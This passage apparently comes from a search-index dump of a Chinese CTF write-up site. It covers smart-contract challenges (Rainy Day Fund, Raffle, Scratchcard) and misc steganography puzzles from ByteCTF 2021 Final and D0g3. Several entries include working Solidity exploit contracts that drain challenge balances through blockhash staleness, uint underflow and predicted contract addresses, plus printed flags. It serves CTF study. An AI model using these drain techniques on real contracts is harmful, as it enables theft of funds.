ether\uff0c\u8fd9\u65f6\u91cd\u542f\u9898\u76ee\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u9898\u76ee\u5408\u7ea6\uff0c\u5176\u4e2d\u521b\u5efa DebugAuthorizer \u65f6\u68c0\u67e5 balance \u53d1\u73b0\u5df2\u7ecf\u6709\u4e86 1.337 ether\uff0c\u4e5f\u5c31\u6253\u5f00\u4e86 debug mode \u53ef\u4ee5\u76f4\u63a5 withdraw \u800c\u63d0\u524d\u8ba1\u7b97\u5408\u7ea6\u5730\u5740\u7684\u65b9\u6cd5\u5c31\u662f\u8fd0\u7528 create \u7684\u539f\u7406\uff0c\u5373\u5916\u90e8\u8d26\u6237\u521b\u5efa\u5408\u7ea6\u6216\u8005\u5728\u5408\u7ea6\u4e2d\u901a\u8fc7 CREATE \u64cd\u4f5c\u7801\u521b\u5efa\u65b0\u5408\u7ea6\u7684\u65f6\u5019\u8ba1\u7b97\u5730\u5740\u7684\u7b97\u6cd5\u662f\uff1a keccak ( rlp . encode ([ deployer , nonce ])) \u5e76\u4e14\u5728\u5408\u7ea6\u5185\u90e8\u901a\u8fc7 CREATE \u521b\u5efa\u65b0\u5408\u7ea6\u7684\u8bdd\uff0cnonce \u5e94\u8be5\u662f 1 \u76ee\u524d\u9700\u8981\u77e5\u9053\u7684\u662f developer\uff08\u53ef\u4ee5\u901a\u8fc7 etherscan \u67e5\u5230\uff09\u90e8\u7f72\u5f53\u524d\u9898\u76ee\u5408\u7ea6\u65f6\u7684 nonce \u662f\u591a\u5c11\uff08\u77e5\u9053\u4e86\u8fd9\u4e2a\u4e4b\u540e\u4e0b\u4e00\u6b21\u518d\u90e8\u7f72\u7684 nonce \u5c31\u662f\u5176\u52a0\u4e00\uff09\uff0c\u53ea\u9700\u8981\u679a\u4e3e\u4e00\u4e0b nonce \u8ba1\u7b97\u5730\u5740\u518d\u548c\u5f53\u524d\u9898\u76ee\u5730\u5740\u6bd4\u8f83\u4e00\u4e0b\u5c31\u53ef\u4ee5\u7206\u7834\u51fa\u6765\uff1a import rlp import web3 def calc_address ( deployer , nonce ): return web3 . Web3 . keccak ( rlp . encode ([ deployer , nonce ])) for nonce in range ( 1 , 1000000 ): if calc_address ( 0xeD0D5160c642492b3B482e006F67679F5b6223A2 , nonce ) . hex () . endswith ( \"66318f6b06fd5769fa310732566b13d92cfbc589\" ): print ( nonce ) break \u53ef\u4ee5\u5f97\u5230\u5f53\u524d nonce \u662f 484\uff0c\u6240\u4ee5\u4e0b\u4e00\u6b21\u518d\u90e8\u7f72\u9898\u76ee\u7684 nonce \u5c31\u662f 485\u3002\u7136\u540e\u63d0\u524d\u8ba1\u7b97\u9898\u76ee\u5730\u5740\u548c DebugAuthorizer \u5730\u5740\uff1a deployer = 0xeD0D5160c642492b3B482e006F67679F5b6223A2 nonce = 485 challenge = int ( calc_address ( deployer , nonce ) . hex ()[ - 40 :], 16 ) print ( f \"next challenge address: { hex ( challenge ) } \" ) debug = int ( calc_address ( challenge , 1 ) . hex ()[ - 40 :], 16 ) print ( f \"next DebugAuthorizer address: { hex ( debug ) } \" ) \"\"\" next challenge address: 0xe3ddc258e3c557c11d8f54bb72583bd36d7af22d next DebugAuthorizer address: 0xe177fc1703942b50cd95a87bb9dfa4ab3cf3a1fe \"\"\" \u6240\u4ee5\u5148\u5411 0xe177fc1703942b50cd95a87bb9dfa4ab3cf3a1fe \u8f6c\u8d26 1.337 ether\uff0c\u518d\u91cd\u7f6e\u9898\u76ee\uff08\u53ef\u4ee5\u9a8c\u8bc1\u4e00\u4e0b\u73b0\u5728\u7684\u9898\u76ee\u5730\u5740\u5c31\u662f 0xe3ddc258e3c557c11d8f54bb72583bd36d7af22d\uff09\uff0c\u76f4\u63a5\u8c03\u7528 withdraw \u51fd\u6570\u5c31\u53ef\u4ee5\u4e86","title":"Rainy Day Fund"},{"location":"writeups/SecurityInnovation/#raffle","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; contract Raffle is CtfFramework { uint256 constant fee = 0 . 1 ether ; address private admin ; bytes4 private winningTicket ; uint256 private blocknum ; uint256 public ticketsBought ; bool public raffleStopped ; mapping ( address => uint256 ) private rewards ; mapping ( address => bool ) private potentialWinner ; mapping ( address => bytes4 ) private ticketNumbers ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { rewards [ address ( this )] = msg.value ; admin = msg.sender ; } function buyTicket () external payable ctf { if ( msg.value >= fee ){ winningTicket = bytes4 ( 0 ); blocknum = block.number + 1 ; ticketsBought += 1 ; raffleStopped = false ; rewards [ msg.sender ] += msg.value ; ticketNumbers [ msg.sender ] = bytes4 (( msg.value - fee ) / 10 ** 8 ); potentialWinner [ msg.sender ] = true ; } } function closeRaffle () external ctf { require ( ticketsBought > 0 ); require ( ! raffleStopped ); require ( blocknum != 0 ); require ( winningTicket == bytes4 ( 0 )); require ( block.number > blocknum ); require ( msg.sender == admin || rewards [ msg.sender ] > 0 ); winningTicket = bytes4 ( blockhash ( blocknum )); potentialWinner [ msg.sender ] = false ; raffleStopped = true ; } function collectReward () external payable ctf { require ( raffleStopped ); require ( potentialWinner [ msg.sender ]); rewards [ address ( this )] += msg.value ; if ( winningTicket == ticketNumbers [ msg.sender ]){ msg.sender . transfer ( rewards [ msg.sender ]); msg.sender . transfer ( rewards [ address ( this )]); rewards [ msg.sender ] = 0 ; rewards [ address ( this )] = 0 ; } } function skimALittleOffTheTop ( uint256 _value ) external ctf { require ( msg.sender == admin ); require ( rewards [ address ( this )] > _value ); rewards [ address ( this )] = rewards [ address ( this )] - _value ; msg.sender . transfer ( _value ); } function () public payable ctf { if ( msg.value >= fee ){ this . buyTicket (); } else if ( msg.value == 0 ){ this . closeRaffle (); } else { this . collectReward (); } } } \u662f\u4e00\u4e2a\u62bd\u5956\uff0c\u9700\u8981\u901a\u8fc7 buyTicket \u4e70\u7968\u83b7\u5f97\u8d44\u683c\uff0c\u5e76\u4e14 ticketNumbers \u4e3a (msg.value - fee)/10**8\uff0c\u7ed3\u675f\u62bd\u5956\u9700\u8981\u8c03\u7528 closeRaffle \u51fd\u6570\uff0c\u4f46\u662f\u8fd9\u4e5f\u4f1a\u53d6\u6d88\u62bd\u5956\u8d44\u683c\u3002\u800c\u6700\u540e\u62bd\u4e2d\u7684 ticketNumbers \u4e3a\u6700\u540e\u4e00\u4e2a\u4e70\u7968\u7684 blocknum \u7684 blockhash \u8fd9\u5c31\u6709\u4e86\u4e00\u4e2a\u6f0f\u6d1e\uff0cblockhash \u53ea\u4f1a\u8ba1\u7b97\u6700\u8fd1\u7684 256 \u4e2a\u5757\uff0c\u518d\u65e9\u7684\u7ed3\u679c\u4f1a\u662f 0 \u4f46\u662f\u5982\u679c\u4f7f\u7528\u4e24\u4e2a\u5408\u7ea6\u4e00\u4e2a\u6765\u5173\u95ed\u62bd\u5956\uff0c\u53e6\u4e00\u4e2a\u9886\u5956\u7684\u8bdd\uff0c\u4e0d\u80fd\u53d6\u51fa\u5168\u90e8\u7684\u4f59\u989d\uff08\u56e0\u4e3a\u5173\u95ed\u62bd\u5956\u7684\u8d26\u6237\u4e70\u7968\u7684\u94b1\u4e0d\u4f1a\u8f6c\u51fa\u6765\uff09\u3002\u56e0\u6b64\u9700\u8981\u901a\u8fc7 fallback \u51fd\u6570\uff0cvalue \u4e3a 0 \u7684\u65f6\u5019\u4f1a\u8c03\u7528 closeRaffle\uff0c\u8fd9\u4f1a\u4f7f closeRaffle \u5224\u65ad\u7684 msg.sender \u4e3a\u81ea\u8eab\u3002\u6240\u4ee5\u53ea\u9700\u8981\u4e70\u4e0b\u7968\uff0c\u7136\u540e\u7b49\u5f85\u51fa 256 \u4e2a\u5757\u4e4b\u540e\u89e6\u53d1 fallback \u7136\u540e\u518d collectReward \u5c31\u597d\u4e86 \u8fd9\u91cc\u6ce8\u610f\u8fd8\u8981\u628a\u9898\u76ee\u5408\u7ea6\u5730\u5740\u901a\u8fc7\u8c03\u7528 ctf_challenge_add_authorized_sender \u52a0\u5165\u767d\u540d\u5355\uff0c\u624d\u53ef\u4ee5\u5728 fallback \u4e2d\u8c03\u7528\u81ea\u8eab\u51fd\u6570 exp contract Exploit { Raffle challenge ; constructor ( address addr ) public { challenge = Raffle ( addr ); } function buyTicket () public payable { challenge . buyTicket . value ( msg.value )(); } function exp () public { address ( challenge ). call . value ( 0 ether )(); challenge . collectReward (); } function () public payable {} function destroy ( address addr ) public { selfdestruct ( addr ); } }","title":"Raffle"},{"location":"writeups/SecurityInnovation/#scratchcard","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; library Address { function isContract ( address account ) internal view returns ( bool ) { uint256 size ; assembly { size : = extcodesize ( account ) } return size > 0 ; } } contract Scratchcard is CtfFramework { event CardPurchased ( address indexed player , uint256 cost , bool winner ); mapping ( address => uint256 ) private winCount ; uint256 private cost ; using Address for address ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { } modifier notContract (){ require ( ! msg.sender . isContract (), \"Contracts Not Allowed\" ); _ ; } function play () public payable notContract ctf { bool won = false ; if (( now % 10 ** 8 ) * 10 ** 10 == msg.value ){ won = true ; winCount [ msg.sender ] += 1 ; cost = msg.value ; msg.sender . transfer ( cost ); } else { cost = 0 ; winCount [ msg.sender ] = 0 ; } emit CardPurchased ( msg.sender , msg.value , won ); } function checkIfMegaJackpotWinner () public view returns ( bool ){ return ( winCount [ msg.sender ] >= 25 ); } function collectMegaJackpot ( uint256 _amount ) public notContract ctf { require ( checkIfMegaJackpotWinner (), \"User Not Winner\" ); require ( 2 * cost - _amount > 0 , \"Winners May Only Withdraw Up To 2x Their Scratchcard Cost\" ); winCount [ msg.sender ] = 0 ; msg.sender . transfer ( _amount ); } function () public payable ctf { play (); } } \u8c03\u7528 play \u6765\u731c\u968f\u673a\u6570\uff0cplay \u51fd\u6570\u6709\u4e00\u4e2a notContract \u7684 modifier\uff0c\u8fd9\u4e2a\u53ef\u4ee5\u901a\u8fc7\u5728 constructor \u4e2d\u76f4\u63a5\u64cd\u4f5c\u6765\u7ed5\u8fc7\uff0c\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u5728\u653b\u51fb\u5408\u7ea6\u4e2d\u8c03\u7528 25 \u6b21 play \u51fd\u6570\u6765\u8fbe\u5230\u6761\u4ef6\uff0c\u8f6c\u51fa\u7684\u65f6\u5019\u867d\u7136\u5224\u65ad\u4e86 2 * cost - _amount > 0 \u4f46\u90fd\u662f uint \u53ef\u4ee5\u4e0b\u6ea2\uff0c\u6240\u4ee5\u76f4\u63a5\u8f6c\u51fa\u5168\u90e8\u5c31\u597d\u4e86 \u53e6\u5916\u8fd8\u9700\u8981\u63d0\u524d\u8ba1\u7b97\u4e00\u4e0b\u653b\u51fb\u5408\u7ea6\u7684\u5730\u5740\uff0c\u518d\u8c03\u7528 ctf_challenge_add_authorized_sender \u51fd\u6570\u9884\u5148\u628a\u8981\u90e8\u7f72\u7684\u653b\u51fb\u5408\u7ea6\u7684\u4f4d\u7f6e\u52a0\u5165\u767d\u540d\u5355\u540e\u624d\u53ef\u4ee5\u90e8\u7f72\u653b\u51fb\u5408\u7ea6 exp contract Attacker { Scratchcard challenge ; uint public count ; uint public money ; constructor ( address addr , address player ) public payable { challenge = Scratchcard ( addr ); count = 0 ; while ( count < 25 ) { money = ( now % 10 ** 8 ) * 10 ** 10 ; challenge . play . value ( money )(); count += 1 ; } challenge . collectMegaJackpot ( addr . balance ); selfdestruct ( player ); } function () public payable {} } contract Exploit { Scratchcard challenge ; address player ; uint8 public nonce ; constructor ( address addr , address _player ) public { challenge = Scratchcard ( addr ); player = _player ; nonce = 1 ; } function exp () public payable { address attacker = address ( keccak256 ( 0xd6 , 0x94 , this , nonce )); nonce += 1 ; challenge . ctf_challenge_add_authorized_sender ( attacker ); address ( attacker ). transfer ( 4 ether ); Attacker newAttacker = new Attacker ( address ( challenge ), player ); } function () public payable {} function destroy () public { selfdestruct ( player ); } }","title":"Scratchcard"},{"location":"writeups/bytectf2021_final/","text":"ByteCTF 2021 Final Writeup \u00b6 Abstract \u8fd9\u573a\u6bd4\u8d5b misc AK \u4e86\uff0c\u8fd8\u633a\u723d\u7684 Enrich Life \u00b6 \u9996\u5148\u4f7f\u7528 ffprobe \u53d1\u73b0 description \u91cc\u7684 hint\uff1a FlagInChromaFrames \uff0c\u4ee5\u53ca\u989c\u8272\u683c\u5f0f\u4e3a yuv240p\uff0c\u6240\u4ee5\u601d\u8def\u5c31\u662f\u770b\u4e00\u770b yuv \u4e2d\u4ee3\u8868\u8272\u5ea6 chroma \u7684 uv \u5206\u91cf \u901a\u8fc7\u548c\u6296\u97f3\u4e0a\u7684\u6e90\u89c6\u9891\u5bf9\u6bd4\u53d1\u73b0\u9898\u76ee\u89c6\u9891\u7684\u524d\u534a\u6bb5\u6709\u6bd4\u8f83\u660e\u663e\u7684\u6d45\u7ea2\u8272\uff08v\uff09\u95ea\u70c1\uff0c\u5e76\u4e14\u7ecf\u8fc7 YuvEye \u6253\u5f00\u89c2\u5bdf\uff0c\u53d1\u73b0 v \u901a\u9053\u5404\u4e2a\u5e27\u4e4b\u95f4\u6709\u660e\u663e\u7684\u660e\u6697\u53d8\u5316\uff0c\u6301\u7eed\u5230 1160 \u5e27\u5de6\u53f3\u6062\u590d\u6b63\u5e38 \u5408\u7406\u731c\u6d4b v \u5206\u91cf\u4e2d\u5229\u7528\u76f8\u5bf9\u7684\u660e/\u6697\u4ee3\u886801\u4ee5\u67d0\u79cd\u65b9\u5f0f\u85cf\u4e86\u4fe1\u606f \u6839\u636e hint\uff1aPlot the data you found over time and find the pattern\uff0c\u628a\u6bcf\u4e00\u5e27\u7684 v \u5206\u91cf\u7684\u5e73\u5747\u503c\u968f\u65f6\u95f4\u7684\u53d8\u5316\u753b\u51fa\u6563\u70b9\u56fe\uff1a import cv2 import numpy as np import matplotlib.pyplot as plt video = cv2 . VideoCapture ( 'enrich_life.mp4' ) n = 300 x = [ i for i in range ( n * 8 )] y = [] for i in range ( n * 8 ): _ , frame = video . read () frame = frame [:, :, :] frame = cv2 . cvtColor ( frame , cv2 . COLOR_BGR2YUV ) Y , U , V = cv2 . split ( frame ) y . append ( np . abs ( np . average ( V ))) plt . figure ( figsize = ( 64 , 16 )) plt . scatter ( x , y , s = 1 ) plt . show () print ( y ) \u53d1\u73b0\u524d\u671f\u7684 v \u5206\u91cf\u5448\u73b0\u51fa 5 \u4e2a\u4e00\u7ec4\u7684\u4e0a\u5347/\u4e0b\u964d\uff0c\u6240\u4ee5\u628a\u4e0a\u5347\u7684\u4e00\u7ec4\u8bb0\u4e3a 1\uff0c\u4e0b\u964d\u7684\u4e00\u7ec4\u8bb0\u4e3a 0\uff0c\u8f6c\u6362\u5f97\u5230 flag\uff1a import cv2 import numpy as np from Crypto.Util.number import * video = cv2 . VideoCapture ( 'enrich_life.mp4' ) y = np . reshape ([ np . abs ( np . average ( cv2 . split ( cv2 . cvtColor ( video . read ()[ 1 ][:,:,:], cv2 . COLOR_BGR2YUV ))[ 2 ])) for _ in range ( 150 * 8 )], ( 240 , 5 )) print ( long_to_bytes ( int ( \"\" . join ([ '1' if y [ i , 0 ] < y [ i , 1 ] else '0' for i in range ( 240 )]), 2 ))) # b'ByteCTF{bYTEctf-SecurityYYDS}\\x8a' FPS_game \u00b6 \u5730\u9762\u9ad8\u5ea6 1072851582\uff0c\u7528 Cheat Engine \u6539\u6210 1078000000 \u9501\u5b9a \u53e6\u89e3\uff1a\u628a dll\uff08\u7528 il2cppdumper \u8f85\u52a9\u5206\u6790\uff09\u4e2d\u89d2\u8272\u662f\u5426\u5728\u5730\u9762\u7684\u5224\u5b9a\u6539\u4e3a\u6052\u4e3a\u771f\uff0c\u8fd9\u6837\u5728\u7a7a\u4e2d\u4e5f\u80fd\u7ee7\u7eed\u5411\u4e0a\u8df3\u3002 Lisa's cat \u00b6 \u7528 RGB2YUV \u8f6c\u6362\u56fe\u7247 \u5728 green 0 \u4e2d\u770b\u5230\u4e0b\u56fe \u7136\u540e\u83b7\u53d6 red 0 \u548c blue 0 \u611f\u89c9\u5f88\u50cf\uff0c\u5f02\u6216\u4e00\u4e0b\u5f97\u5230\u4e0b\u56fe \u6839\u636e hint\uff0c\u731c\u6d4b\u662f\u4f7f\u7528 Arnold's Cat Map \u8fdb\u884c\u53d8\u6362\uff0c\u518d\u6839\u636e green 0 \u4e2d\u7684\u6570\u5b57\u53d6 Cat Map \u53c2\u6570 import os from PIL.Image import open as load_pic , new as new_pic def main ( path , iterations , name = \"arnold_cat- {name} - {index} .png\" ): title = os . path . splitext ( os . path . split ( path )[ 1 ])[ 0 ] ppath = path counter = 0 while counter < iterations : with load_pic ( path ) as image : dim = width , height = image . size with new_pic ( image . mode , dim ) as canvas : for x in range ( width ): for y in range ( height ): nx = ( 1 * x + 20 * y ) % width ny = ( 21 * x + 421 * y ) % height canvas . putpixel (( nx , height - ny - 1 ), image . getpixel (( x , height - y - 1 ))) counter += 1 print ( counter , end = \" \\r \" ) path = name . format ( name = title , index = counter ) canvas . save ( path ) return canvas result = main ( \"233.bmp\" , 384 ) result . show () \u7b2c\u4e00\u5f20\u56fe\u5c31\u662f Undercover \u00b6 \u62ff\u5230\u9898\u76ee\u53d1\u73b0\u7ed9\u9898\u7684\u65b9\u5f0f\u4e0d\u662f\u53d1\u9644\u4ef6\u800c\u662f\u76f4\u63a5\u63d2\u5165\u56fe\u7247\uff0c\u6240\u4ee5\u8003\u8651\u662f\u4e0d\u662f\u548c\u94fe\u63a5\u6709\u5173\u7cfb\uff1a https://p3.toutiaoimg.com/img/tos-cn-i-qvj2lq49k0/7a19b5d53d014130ab3c00f73a8d4645~tplv-yykgsuqxec-imagexlite-0bb543cf5d800a1a226c9d1fe716be95.png \u53d1\u73b0\u4e86 ~tplv- \uff0c\u6240\u4ee5\u4e0a\u56fe\u5e94\u8be5\u662f\u4f7f\u7528 velmageX \u7528\u5904\u7406\u6a21\u677f\u5904\u7406\u8fc7\u7684\uff0c\u6240\u4ee5\u5c31\u76f4\u63a5\u5220\u6389\u5904\u7406\uff0c\u5f97\u5230\u539f\u59cb\u56fe\u7247\u7684\u5730\u5740\uff1a https://p3.toutiaoimg.com/img/tos-cn-i-qvj2lq49k0/7a19b5d53d014130ab3c00f73a8d4645~tplv-yykgsuqxec-image.png \u6216 https://p3.toutiaoimg.com/img/tos-cn-i-qvj2lq49k0/7a19b5d53d014130ab3c00f73a8d4645~noop.png \u518d\u6839\u636e hint\uff1aOriginal image have exif\uff0c\u67e5\u770b\u8fd9\u4e2a\u56fe\u7247\u7684 exif\uff0c\u53d1\u73b0\u6709 Author \u4e00\u9879\uff1a Author: From: Zach Oakes \u641c\u7d22 Zach Oakes \u53d1\u73b0\u4ed6\u5199\u7684\u4e00\u4e2a\u9690\u5199\u5de5\u5177\uff1a https://sekao.net/pixeljihad/ \u628a\u8fd9\u5f20\u56fe\u7247\u4f20\u5165\u62ff\u5230 flag\uff1a","title":"ByteCTF 2021 Final"},{"location":"writeups/bytectf2021_final/#bytectf-2021-final-writeup","text":"Abstract \u8fd9\u573a\u6bd4\u8d5b misc AK \u4e86\uff0c\u8fd8\u633a\u723d\u7684","title":"ByteCTF 2021 Final Writeup"},{"location":"writeups/bytectf2021_final/#enrich-life","text":"\u9996\u5148\u4f7f\u7528 ffprobe \u53d1\u73b0 description \u91cc\u7684 hint\uff1a FlagInChromaFrames \uff0c\u4ee5\u53ca\u989c\u8272\u683c\u5f0f\u4e3a yuv240p\uff0c\u6240\u4ee5\u601d\u8def\u5c31\u662f\u770b\u4e00\u770b yuv \u4e2d\u4ee3\u8868\u8272\u5ea6 chroma \u7684 uv \u5206\u91cf \u901a\u8fc7\u548c\u6296\u97f3\u4e0a\u7684\u6e90\u89c6\u9891\u5bf9\u6bd4\u53d1\u73b0\u9898\u76ee\u89c6\u9891\u7684\u524d\u534a\u6bb5\u6709\u6bd4\u8f83\u660e\u663e\u7684\u6d45\u7ea2\u8272\uff08v\uff09\u95ea\u70c1\uff0c\u5e76\u4e14\u7ecf\u8fc7 YuvEye \u6253\u5f00\u89c2\u5bdf\uff0c\u53d1\u73b0 v \u901a\u9053\u5404\u4e2a\u5e27\u4e4b\u95f4\u6709\u660e\u663e\u7684\u660e\u6697\u53d8\u5316\uff0c\u6301\u7eed\u5230 1160 \u5e27\u5de6\u53f3\u6062\u590d\u6b63\u5e38 \u5408\u7406\u731c\u6d4b v \u5206\u91cf\u4e2d\u5229\u7528\u76f8\u5bf9\u7684\u660e/\u6697\u4ee3\u886801\u4ee5\u67d0\u79cd\u65b9\u5f0f\u85cf\u4e86\u4fe1\u606f \u6839\u636e hint\uff1aPlot the data you found over time and find the pattern\uff0c\u628a\u6bcf\u4e00\u5e27\u7684 v \u5206\u91cf\u7684\u5e73\u5747\u503c\u968f\u65f6\u95f4\u7684\u53d8\u5316\u753b\u51fa\u6563\u70b9\u56fe\uff1a import cv2 import numpy as np import matplotlib.pyplot as plt video = cv2 . VideoCapture ( 'enrich_life.mp4' ) n = 300 x = [ i for i in range ( n * 8 )] y = [] for i in range ( n * 8 ): _ , frame = video . read () frame = frame [:, :, :] frame = cv2 . cvtColor ( frame , cv2 . COLOR_BGR2YUV ) Y , U , V = cv2 . split ( frame ) y . append ( np . abs ( np . average ( V ))) plt . figure ( figsize = ( 64 , 16 )) plt . scatter ( x , y , s = 1 ) plt . show () print ( y ) \u53d1\u73b0\u524d\u671f\u7684 v \u5206\u91cf\u5448\u73b0\u51fa 5 \u4e2a\u4e00\u7ec4\u7684\u4e0a\u5347/\u4e0b\u964d\uff0c\u6240\u4ee5\u628a\u4e0a\u5347\u7684\u4e00\u7ec4\u8bb0\u4e3a 1\uff0c\u4e0b\u964d\u7684\u4e00\u7ec4\u8bb0\u4e3a 0\uff0c\u8f6c\u6362\u5f97\u5230 flag\uff1a import cv2 import numpy as np from Crypto.Util.number import * video = cv2 . VideoCapture ( 'enrich_life.mp4' ) y = np . reshape ([ np . abs ( np . average ( cv2 . split ( cv2 . cvtColor ( video . read ()[ 1 ][:,:,:], cv2 . COLOR_BGR2YUV ))[ 2 ])) for _ in range ( 150 * 8 )], ( 240 , 5 )) print ( long_to_bytes ( int ( \"\" . join ([ '1' if y [ i , 0 ] < y [ i , 1 ] else '0' for i in range ( 240 )]), 2 ))) # b'ByteCTF{bYTEctf-SecurityYYDS}\\x8a'","title":"Enrich Life"},{"location":"writeups/bytectf2021_final/#fps_game","text":"\u5730\u9762\u9ad8\u5ea6 1072851582\uff0c\u7528 Cheat Engine \u6539\u6210 1078000000 \u9501\u5b9a \u53e6\u89e3\uff1a\u628a dll\uff08\u7528 il2cppdumper \u8f85\u52a9\u5206\u6790\uff09\u4e2d\u89d2\u8272\u662f\u5426\u5728\u5730\u9762\u7684\u5224\u5b9a\u6539\u4e3a\u6052\u4e3a\u771f\uff0c\u8fd9\u6837\u5728\u7a7a\u4e2d\u4e5f\u80fd\u7ee7\u7eed\u5411\u4e0a\u8df3\u3002","title":"FPS_game"},{"location":"writeups/bytectf2021_final/#lisas-cat","text":"\u7528 RGB2YUV \u8f6c\u6362\u56fe\u7247 \u5728 green 0 \u4e2d\u770b\u5230\u4e0b\u56fe \u7136\u540e\u83b7\u53d6 red 0 \u548c blue 0 \u611f\u89c9\u5f88\u50cf\uff0c\u5f02\u6216\u4e00\u4e0b\u5f97\u5230\u4e0b\u56fe \u6839\u636e hint\uff0c\u731c\u6d4b\u662f\u4f7f\u7528 Arnold's Cat Map \u8fdb\u884c\u53d8\u6362\uff0c\u518d\u6839\u636e green 0 \u4e2d\u7684\u6570\u5b57\u53d6 Cat Map \u53c2\u6570 import os from PIL.Image import open as load_pic , new as new_pic def main ( path , iterations , name = \"arnold_cat- {name} - {index} .png\" ): title = os . path . splitext ( os . path . split ( path )[ 1 ])[ 0 ] ppath = path counter = 0 while counter < iterations : with load_pic ( path ) as image : dim = width , height = image . size with new_pic ( image . mode , dim ) as canvas : for x in range ( width ): for y in range ( height ): nx = ( 1 * x + 20 * y ) % width ny = ( 21 * x + 421 * y ) % height canvas . putpixel (( nx , height - ny - 1 ), image . getpixel (( x , height - y - 1 ))) counter += 1 print ( counter , end = \" \\r \" ) path = name . format ( name = title , index = counter ) canvas . save ( path ) return canvas result = main ( \"233.bmp\" , 384 ) result . show () \u7b2c\u4e00\u5f20\u56fe\u5c31\u662f","title":"Lisa's cat"},{"location":"writeups/bytectf2021_final/#undercover","text":"\u62ff\u5230\u9898\u76ee\u53d1\u73b0\u7ed9\u9898\u7684\u65b9\u5f0f\u4e0d\u662f\u53d1\u9644\u4ef6\u800c\u662f\u76f4\u63a5\u63d2\u5165\u56fe\u7247\uff0c\u6240\u4ee5\u8003\u8651\u662f\u4e0d\u662f\u548c\u94fe\u63a5\u6709\u5173\u7cfb\uff1a https://p3.toutiaoimg.com/img/tos-cn-i-qvj2lq49k0/7a19b5d53d014130ab3c00f73a8d4645~tplv-yykgsuqxec-imagexlite-0bb543cf5d800a1a226c9d1fe716be95.png \u53d1\u73b0\u4e86 ~tplv- \uff0c\u6240\u4ee5\u4e0a\u56fe\u5e94\u8be5\u662f\u4f7f\u7528 velmageX \u7528\u5904\u7406\u6a21\u677f\u5904\u7406\u8fc7\u7684\uff0c\u6240\u4ee5\u5c31\u76f4\u63a5\u5220\u6389\u5904\u7406\uff0c\u5f97\u5230\u539f\u59cb\u56fe\u7247\u7684\u5730\u5740\uff1a https://p3.toutiaoimg.com/img/tos-cn-i-qvj2lq49k0/7a19b5d53d014130ab3c00f73a8d4645~tplv-yykgsuqxec-image.png \u6216 https://p3.toutiaoimg.com/img/tos-cn-i-qvj2lq49k0/7a19b5d53d014130ab3c00f73a8d4645~noop.png \u518d\u6839\u636e hint\uff1aOriginal image have exif\uff0c\u67e5\u770b\u8fd9\u4e2a\u56fe\u7247\u7684 exif\uff0c\u53d1\u73b0\u6709 Author \u4e00\u9879\uff1a Author: From: Zach Oakes \u641c\u7d22 Zach Oakes \u53d1\u73b0\u4ed6\u5199\u7684\u4e00\u4e2a\u9690\u5199\u5de5\u5177\uff1a https://sekao.net/pixeljihad/ \u628a\u8fd9\u5f20\u56fe\u7247\u4f20\u5165\u62ff\u5230 flag\uff1a","title":"Undercover"},{"location":"writeups/d0g3/","text":"\u7b2c\u56db\u5c4a\u201c\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b Writeup \u00b6 Abstract \u8fd9\u6b21\u7684 misc \u7b97\u662f\u505a\u5f97\u6bd4\u8f83\u597d\uff0c\u4e0b\u9762\u662f writeup Cthulhu Mythos \u00b6 hint.mp3 \u5f00\u5934\u662f\u300aOverworld Day\u300b\u6cf0\u62c9\u745e\u4e9aOST \u540e\u9762\u662fSSTV\uff0cScottie1\u6a21\u5f0f\u3002\u5f97\u5230\u56fe\u7247\uff1a MRPVI4TZL5KGK4TSGRZGSYJBPU====== Base32 \u89e3\u7801\uff1a d_Try_Terr4ria!} \u4ece\u56fe\u7247\u4e5f\u80fd\u770b\u51fa\u8fd9\u662f\u4e00\u4e2a Base32 \u7684\u540e\u534a\u90e8\u5206\uff0c\u9700\u8981\u627e\u524d\u9762\u7684\u4e00\u622a \u7136\u540e\u6253\u5f00\u90a3\u4e2awld\u6587\u4ef6\uff1a 7I4YF6QLO \u4ed4\u7ec6\u627e\u8fd8\u53ef\u4ee5\u53d1\u73b0\u56db\u4e2a\u7bb1\u5b50\uff1a \u7bb1\u5b50 3\u6761\u62fc\u5728\u4e00\u8d77\u662f\u5b8c\u6574\u7684 Base32 IQYGOM33JUYW4ZLDKI2GM5C7I4YF6QLOMRPVI4TZL5KGK4TSGRZGSYJBPU====== Base32\uff1a D0g3{M1necR4ft_G0_And_Try_Terr4ria!} lovemath \u00b6 \u6839\u636e\u9898\u5e72\u53ef\u4ee5\u63a8\u6d4b\u51fa\u8981\u7528\u5230 Tupper's Self-Referential Formula \u5148\u770b\u538b\u7f29\u5305 flag\u649eCRC\u6821\u9a8c \u5bc6\u7801: th1s_Is_Y0ur_pa33w0rd_We1c0m3e \u89e3\u538b\u51fa\u6765\u7684\u56fe\u7247: \u8fd9\u4e2a\u4e22\u8fdb stegsolve \u540e red 0 \u6bd4\u8f83\u8be1\u5f02\uff0c\u6240\u4ee5\u7528 LSB \u9690\u5199\u8bd5\u8bd5 \u5220\u6389\u5f00\u5934\u7684\u810f\u6570\u636e\u5f97\u5230\uff1a \u8fd9\u4e2a\u8f6c\u6587\u5b57\u8f93\u5230 Tupper's Self-Referential Formula \u7684\u5728\u7ebf\u7f51\u7ad9 https://tuppers-formula.ovh/ \u91cc 1251077695482776025338577125579215707216262981842821000162276994967943212822693842845266851984880336702446444408289977864567921038435144120176357529686342977212633764247620567669441602729004003473312468776582473461071462631554533766709934484393185739708817165738912742570170547790145328253304755428563911689057632001795598667127514331122190795355921436735375126688142856470280128821316586008242687241930886868804388482643589009068543771977163419519208340324352 D0g3{I_LOV3_math} CyzCC_loves_LOL \u00b6 \u5f00\u59cb\u662f LOLcode \uff0c\u8f6c\u6362\u5f97\u5230\u538b\u7f29\u5305\u5bc6\u7801 AGdJfpqebmXpptloa \u5f97\u5230\u4e24\u5f20\u56fe\u7247\uff0c\u4e00\u5f20\u540d\u5b57\u662f jinx's_flag_in_silent.jpg \u63a8\u6d4b\u662f\u7528\u4e86 SilentEye \u8fd9\u4e2a\u8f6f\u4ef6\u85cf\u4e86 flag\uff0c\u9700\u8981\u4e00\u4e2a\u5bc6\u7801 